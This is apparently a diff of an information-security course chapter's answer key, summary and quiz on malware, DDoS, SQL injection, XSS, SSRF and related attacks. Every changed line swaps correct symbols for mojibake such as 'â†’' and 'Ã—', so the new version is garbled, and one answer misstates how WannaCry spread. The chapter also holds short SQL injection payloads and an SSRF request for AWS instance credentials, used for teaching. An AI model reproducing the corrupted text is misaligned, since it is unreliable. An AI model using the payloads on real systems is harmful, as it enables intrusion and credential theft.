@@ -1460,9 +1460,9 @@ flowchart TD
 <details>
 <summary>Show Answer Key</summary>
 
-**A1.** WannaCry lifecycle: (1) phishing email with weaponized document → (2) drops DoublePulsar backdoor → (3) exploits EternalBlue (MS17-010 SMB vuln) → (4) installs ransomware → (5) encrypts files with AES → (6) displays ransom note demanding $300-$600 in Bitcoin → (7) spreads via SMB to other Windows systems on network. Total infected: 230,000+ systems in 150 countries in 4 days.
+**A1.** WannaCry lifecycle: (1) phishing email with weaponized document â†’ (2) drops DoublePulsar backdoor â†’ (3) exploits EternalBlue (MS17-010 SMB vuln) â†’ (4) installs ransomware â†’ (5) encrypts files with AES â†’ (6) displays ransom note demanding $300-$600 in Bitcoin â†’ (7) spreads via SMB to other Windows systems on network. Total infected: 230,000+ systems in 150 countries in 4 days.
 
-**A2.** Attacker spoofs source IP = victim's IP. DNS response goes to victim, not attacker. Victim can trace back to open resolver, but attacker's true IP is never revealed (all responses go to victim). The attacker sends queries from their own IP (but spoofed) → impossible to trace without ISP logs.
+**A2.** Attacker spoofs source IP = victim's IP. DNS response goes to victim, not attacker. Victim can trace back to open resolver, but attacker's true IP is never revealed (all responses go to victim). The attacker sends queries from their own IP (but spoofed) â†’ impossible to trace without ISP logs.
 
 **A3.** UNION: `' UNION SELECT password FROM users WHERE username='admin'--` (single column). Actual: `' UNION SELECT username,password FROM users WHERE '1'='1` (multiple columns). Time-based (MySQL): `' IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a', SLEEP(5), 0)--`
 
@@ -1474,58 +1474,58 @@ flowchart TD
 
 **A7.** Two forged ARP replies: (1) to victim: "192.168.1.1 is at AA:BB:CC:DD:EE:FF" (attacker's MAC for gateway IP). (2) to gateway: "192.168.1.10 is at AA:BB:CC:DD:EE:FF" (attacker's MAC for victim IP). Now all traffic between them goes through attacker.
 
-**A8.** Victim receives: 10,000 × 3000 = 30,000,000 bytes/sec ≈ 240 Mbps. Attacker sends: 10,000 × 60 = 600,000 bytes/sec ≈ 4.8 Mbps. Amplification: 50×. Attacker needs only 4.8 Mbps upload to generate 240 Mbps attack.
+**A8.** Victim receives: 10,000 Ã— 3000 = 30,000,000 bytes/sec â‰ˆ 240 Mbps. Attacker sends: 10,000 Ã— 60 = 600,000 bytes/sec â‰ˆ 4.8 Mbps. Amplification: 50Ã—. Attacker needs only 4.8 Mbps upload to generate 240 Mbps attack.
 
 **A9.** RaaS: developers sell/lease ransomware to affiliates. Affiliates distribute malware and share profits (70/30). Families: REvil (Sodinokibi, $11M ransom demanded from JBS), LockBit (fastest encryption, exfiltrate before encrypt), DarkSide (responsible for Colonial Pipeline, $4.4M).
 
-**A10.** SameSite=Strict: cookie not sent on ANY cross-site request (even clicking link from email → redirects to bank.com → no cookie → not logged in). Lax: cookie sent for top-level GET navigations (link click works) but blocked for POST, img, script. Lax is better UX while still blocking CSRF.
+**A10.** SameSite=Strict: cookie not sent on ANY cross-site request (even clicking link from email â†’ redirects to bank.com â†’ no cookie â†’ not logged in). Lax: cookie sent for top-level GET navigations (link click works) but blocked for POST, img, script. Lax is better UX while still blocking CSRF.
 
 **A11.** `NtQueryDirectoryFile` is the system call for listing files in a directory. When hooked, the rootkit's code intercepts the call, calls the original, then removes its own files from the result before returning. User sees all files EXCEPT the hidden ones. Same technique for processes (NtQuerySystemInformation), registry keys.
 
 **A12.** (1) **No rate limiting:** attacking an API endpoint with unlimited brute-force (credit card testing). (2) **Missing access control in design:** user IDs in URLs (IDOR) without server-side checks. (3) **Trusting client-side validation only:** attacker bypasses JS validation and sends malicious data directly to API. Fix: security by design, threat modeling (STRIDE), and default-deny approach.
 
-**A13.** Stack canary (guard value) placed between local variables and saved EBP/return address. Before function returns, canary is checked — if overwritten, program aborts. Heap overflows: no return address to overwrite (function pointers, vtable pointers on heap). Heap protections: heap cookies, safe unlinking, ASLR.
+**A13.** Stack canary (guard value) placed between local variables and saved EBP/return address. Before function returns, canary is checked â€” if overwritten, program aborts. Heap overflows: no return address to overwrite (function pointers, vtable pointers on heap). Heap protections: heap cookies, safe unlinking, ASLR.
 
-**A14.** WAF: detects known SQLi patterns (regex, scoring), can be bypassed (encoding, obfuscation), blocks before app. Parameterized queries: separates SQL code from data — prevents ALL SQLi regardless of input. WAF is defense-in-depth; parameterized queries are the actual fix.
+**A14.** WAF: detects known SQLi patterns (regex, scoring), can be bypassed (encoding, obfuscation), blocks before app. Parameterized queries: separates SQL code from data â€” prevents ALL SQLi regardless of input. WAF is defense-in-depth; parameterized queries are the actual fix.
 
-**A15.** Attacker is MITM between client and server. Client connects → attacker forwards to real server via HTTP → attacker intercepts HTTPS, downgrades to HTTP, forwards to server (also HTTP or HTTPS). Victim sees HTTP (no padlock). HSTS: server sends `Strict-Transport-Security` header → browser auto-upgrades all future HTTP to HTTPS → attacker cannot downgrade.
+**A15.** Attacker is MITM between client and server. Client connects â†’ attacker forwards to real server via HTTP â†’ attacker intercepts HTTPS, downgrades to HTTP, forwards to server (also HTTP or HTTPS). Victim sees HTTP (no padlock). HSTS: server sends `Strict-Transport-Security` header â†’ browser auto-upgrades all future HTTP to HTTPS â†’ attacker cannot downgrade.
 
 **A16.** (1) Authority: "I'm from IT support, we're upgrading systems." (2) Urgency: "Your account will be locked if not updated now." (3) Reciprocity: "I'm doing you a favor helping first." (4) Familiarity: uses employee's name and details from social media. (5) Pretexting: fabricated scenario "security audit requires password verification."
 
-**A17.** Each SYN consumes 200 μs = 0.0002 sec CPU. Total = 10,000 × 0.0002 = 2.0 seconds of CPU per second. CPU time = 200% — system will be overwhelmed. This is a successful SYN flood.
+**A17.** Each SYN consumes 200 Î¼s = 0.0002 sec CPU. Total = 10,000 Ã— 0.0002 = 2.0 seconds of CPU per second. CPU time = 200% â€” system will be overwhelmed. This is a successful SYN flood.
 
-**A18.** Behavioral biometrics creates a profile of user behavior: typing speed, key press duration (dwell time), mouse movement patterns, swipe gestures. When an attacker logs in (account takeover), their behavior differs → system flags and triggers step-up authentication. Works continuously (not just at login). False positives require fallback mechanisms.
+**A18.** Behavioral biometrics creates a profile of user behavior: typing speed, key press duration (dwell time), mouse movement patterns, swipe gestures. When an attacker logs in (account takeover), their behavior differs â†’ system flags and triggers step-up authentication. Works continuously (not just at login). False positives require fallback mechanisms.
 
 **A19.** Bootkit: infects MBR/VBR (boot sector). Detected by boot-time antivirus or UEFI Secure Boot. Firmware rootkit: infects BIOS/UEFI firmware or device firmware (HDD, SSD, NIC firmware). Persists even after OS reinstall, hard disk replacement, or BIOS update (if not reflashing the firmware). Extremely difficult to detect (requires offline firmware analysis).
 
-**A20.** Timeline: discovered by researcher (or attacker) → (zero-day starts) → exploit developed → attacks begin → vendor notified → CVE assigned → patch developed (avg 15-30 days) → patch deployed → (zero-day ends). The zero-day window is the period from exploit release to patch deployment. Target: reduce window with vulnerability disclosure programs, bug bounties, automated patching.
+**A20.** Timeline: discovered by researcher (or attacker) â†’ (zero-day starts) â†’ exploit developed â†’ attacks begin â†’ vendor notified â†’ CVE assigned â†’ patch developed (avg 15-30 days) â†’ patch deployed â†’ (zero-day ends). The zero-day window is the period from exploit release to patch deployment. Target: reduce window with vulnerability disclosure programs, bug bounties, automated patching.
 
-**A21.** LLM generates malware code variants with different code structure, variable names, logic flow (while maintaining payload). Signature-based AV: each variant has different hash/byte signature → no match. ML-based AV: adversarial examples craft inputs that cause misclassification. AI-generated polymorphism creates unlimited variants at near-zero cost.
+**A21.** LLM generates malware code variants with different code structure, variable names, logic flow (while maintaining payload). Signature-based AV: each variant has different hash/byte signature â†’ no match. ML-based AV: adversarial examples craft inputs that cause misclassification. AI-generated polymorphism creates unlimited variants at near-zero cost.
 
 **A22.** IDOR (Insecure Direct Object Reference): API endpoint `/api/order/12345` returns order details. Attacker changes to `/api/order/12346` and sees another user's order. Fix: server must verify the authenticated user owns/authorized for the requested resource. Never rely on client-side restrictions.
 
-**A23.** TCP RST injection: easier. Attacker sends RST packet with correct sequence number (can be guessed or captured) → connection terminated. TCP session hijacking: harder. Attacker must inject data into active TCP stream with correct sequence/ack numbers, predict next SEQ, inject malicious payload. RST injection causes DoS; hijacking causes data theft.
+**A23.** TCP RST injection: easier. Attacker sends RST packet with correct sequence number (can be guessed or captured) â†’ connection terminated. TCP session hijacking: harder. Attacker must inject data into active TCP stream with correct sequence/ack numbers, predict next SEQ, inject malicious payload. RST injection causes DoS; hijacking causes data theft.
 
-**A24.** Implicit grant: access token returned in URL fragment (#access_token=...). Fragment accessible by browser JavaScript → vulnerable to: XSS (steal from window.location), rogue scripts running in page, referer header leakage. PKCE: code_challenge (SHA-256 of code_verifier) sent in authorize request. Token exchange requires code_verifier — intercepted code useless without verifier.
+**A24.** Implicit grant: access token returned in URL fragment (#access_token=...). Fragment accessible by browser JavaScript â†’ vulnerable to: XSS (steal from window.location), rogue scripts running in page, referer header leakage. PKCE: code_challenge (SHA-256 of code_verifier) sent in authorize request. Token exchange requires code_verifier â€” intercepted code useless without verifier.
 
 **A25.** Dwell time: time from initial compromise to detection. Mandiant's M-Trends 2022: average dwell time = 16 days (globally) / 24 days (Asia-Pacific). Reduced from 416 days (2011) due to improved detection. Target: reduce dwell time with EDR, 24/7 SOC, threat hunting, faster incident response.
 
-**A26.** (1) Sender email slightly different (ceo@company.co vs ceo@company.com). (2) Urgent language ("transfer immediately" "personal favor"). (3) Unusual request (CEO asking finance to wire money — bypassing normal process). (4) Generic greeting or overly formal tone. (5) External email warning banner not present (if company has it). All 5 present → almost certainly phishing.
+**A26.** (1) Sender email slightly different (ceo@company.co vs ceo@company.com). (2) Urgent language ("transfer immediately" "personal favor"). (3) Unusual request (CEO asking finance to wire money â€” bypassing normal process). (4) Generic greeting or overly formal tone. (5) External email warning banner not present (if company has it). All 5 present â†’ almost certainly phishing.
 
-**A27.** ROP (Return-Oriented Programming): when NX/DEP prevents executing code on the stack, attacker chains existing code snippets (gadgets) that end with RET instruction. Each gadget performs small operation (pop, mov, xor, add). Chain of gadget addresses on stack → when each RET executes, it jumps to next gadget → achieves arbitrary computation without executing new code. No stack execution needed.
+**A27.** ROP (Return-Oriented Programming): when NX/DEP prevents executing code on the stack, attacker chains existing code snippets (gadgets) that end with RET instruction. Each gadget performs small operation (pop, mov, xor, add). Chain of gadget addresses on stack â†’ when each RET executes, it jumps to next gadget â†’ achieves arbitrary computation without executing new code. No stack execution needed.
 
-**A28.** Volumetric (L3/4): SYN flood, UDP amplification → high bandwidth but easier to detect and mitigate (Cloudflare, AWS Shield, scrubbing centers). Application (L7): HTTP flood, Slowloris, API abuse → low bandwidth but harder to distinguish from legitimate traffic. L7 requires sophisticated ML-based detection and can bypass basic DDoS protections.
+**A28.** Volumetric (L3/4): SYN flood, UDP amplification â†’ high bandwidth but easier to detect and mitigate (Cloudflare, AWS Shield, scrubbing centers). Application (L7): HTTP flood, Slowloris, API abuse â†’ low bandwidth but harder to distinguish from legitimate traffic. L7 requires sophisticated ML-based detection and can bypass basic DDoS protections.
 
 **A29.** PtH: Attacker extracts NTLM hash (not password) from compromised system's LSASS memory (using Mimikatz). Uses hash to authenticate to other systems via NTLM without knowing password. Works because NTLM uses hash directly in challenge-response. Mitigation: Restricted Admin mode (RDP), LSA protection, Credential Guard, least privilege.
 
-**A30.** SSRF exploitation: App fetches URL from user input (e.g., `/download?url=http://attacker.com/file.pdf`). Attacker changes to `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin` — AWS metadata endpoint. Server fetches and returns IAM credentials. Fix: URL allowlist, block private IP ranges, restrict outbound traffic from app servers, use IMDSv2 (session-based).
+**A30.** SSRF exploitation: App fetches URL from user input (e.g., `/download?url=http://attacker.com/file.pdf`). Attacker changes to `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin` â€” AWS metadata endpoint. Server fetches and returns IAM credentials. Fix: URL allowlist, block private IP ranges, restrict outbound traffic from app servers, use IMDSv2 (session-based).
 </details>
 
 ## Summary
 
 1. **Malware types:** Virus (attaches to host, needs user action), Worm (self-propagating, network spread), Trojan (disguised, no self-replication), Ransomware (encrypts for ransom, WannaCry), Rootkit (hides presence, kernel/firmware level).
 
-2. **DoS/DDoS:** SYN flood (TCP handshake exploitation — SYN cookies defend), Amplification attacks (DNS 50×, NTP 556×, Memcached 51,000×), HTTP flood, Slowloris.
+2. **DoS/DDoS:** SYN flood (TCP handshake exploitation â€” SYN cookies defend), Amplification attacks (DNS 50Ã—, NTP 556Ã—, Memcached 51,000Ã—), HTTP flood, Slowloris.
 
 3. **SQL Injection:** Root cause = unsanitized input in SQL queries. Best defense = parameterized queries. Types: In-band (error/union), Blind (boolean/time), Out-of-band.
 
@@ -1537,11 +1537,11 @@ flowchart TD
 
 7. **Session hijacking:** Stealing session ID via sniffing, XSS, prediction. Prevention: Secure + HttpOnly cookies, HTTPS, session ID regeneration after login.
 
-8. **Zero-day:** Exploit for unknown vulnerability (no patch available). **Buffer overflow:** Writing past buffer boundary → overwriting return address → code execution. Defenses: stack canaries, ASLR, NX/DEP, safe functions.
+8. **Zero-day:** Exploit for unknown vulnerability (no patch available). **Buffer overflow:** Writing past buffer boundary â†’ overwriting return address â†’ code execution. Defenses: stack canaries, ASLR, NX/DEP, safe functions.
 
 ## Practical Takeaways
 
-- **For exam prep:** Memorize attack types and their primary defense mechanisms. Know which attacks exploit specific protocols (SYN flood → TCP, Teardrop → IP fragmentation). Remember OWASP Top 10: Injection (#1), XSS (#2), CSRF (#3), etc. for exams referencing OWASP.
+- **For exam prep:** Memorize attack types and their primary defense mechanisms. Know which attacks exploit specific protocols (SYN flood â†’ TCP, Teardrop â†’ IP fragmentation). Remember OWASP Top 10: Injection (#1), XSS (#2), CSRF (#3), etc. for exams referencing OWASP.
 - **For web applications:** Always use parameterized queries (SQLi defense). Implement CSRF tokens on all state-changing forms. Enable CSP headers. Set HttpOnly + Secure + SameSite cookie flags.
 - **For network security:** Enable SYN cookies. Filter ICMP. Use BCP 38 (ingress/egress filtering) to prevent spoofed source IPs. Deploy WAF for application-layer attacks.
 - **For defense in depth:** Combine signature-based + anomaly-based detection. Implement least privilege. Regular patching. Backup 3-2-1. Security awareness training (phishing simulations).
@@ -1552,15 +1552,15 @@ flowchart TD
 
 **Q1.** Which of the following correctly matches the attack type with its primary target?
 
-A) Slowloris → Database connection pool  
-B) SYN flood → TCP connection backlog  
-C) Teardrop → TLS handshake  
-D) DNS amplification → Application server CPU  
+A) Slowloris â†’ Database connection pool  
+B) SYN flood â†’ TCP connection backlog  
+C) Teardrop â†’ TLS handshake  
+D) DNS amplification â†’ Application server CPU  
 
 <details>
 <summary>Show Answer</summary>
 
-**Answer: B) SYN flood → TCP connection backlog**
+**Answer: B) SYN flood â†’ TCP connection backlog**
 
 **Explanation:** SYN flood targets the server's TCP connection backlog by sending many SYN packets with spoofed source IPs, filling the backlog queue with half-open connections until no new legitimate connections can be established. Slowloris targets web server connection threads (not database). Teardrop targets IP fragment reassembly. DNS amplification targets network bandwidth (not server CPU).
 </details>
@@ -1579,7 +1579,7 @@ D) Stored XSS only affects Internet Explorer; Reflected affects all browsers
 
 **Answer: B) Stored XSS is permanently stored on the server; Reflected XSS is in the URL/response**
 
-**Explanation:** Stored XSS persists on the server (database, file, comment thread) and affects every user who views the affected page. Reflected XSS is embedded in the URL/request and reflected in the immediate response — the victim must be tricked into clicking a crafted link. Both can be prevented by proper output encoding and CSP.
+**Explanation:** Stored XSS persists on the server (database, file, comment thread) and affects every user who views the affected page. Reflected XSS is embedded in the URL/request and reflected in the immediate response â€” the victim must be tricked into clicking a crafted link. Both can be prevented by proper output encoding and CSP.
 </details>
 
 ---
@@ -1635,4 +1635,4 @@ D) A random non-existent IP address
 
 ---
 
-> **Next Chapter:** [Chapter 4 — Digital Signatures & PKI](/courses/information-security/04-digital-signatures-pki/)
+> **Next Chapter:** [Chapter 4 â€” Digital Signatures & PKI](/courses/information-security/04-digital-signatures-pki/)
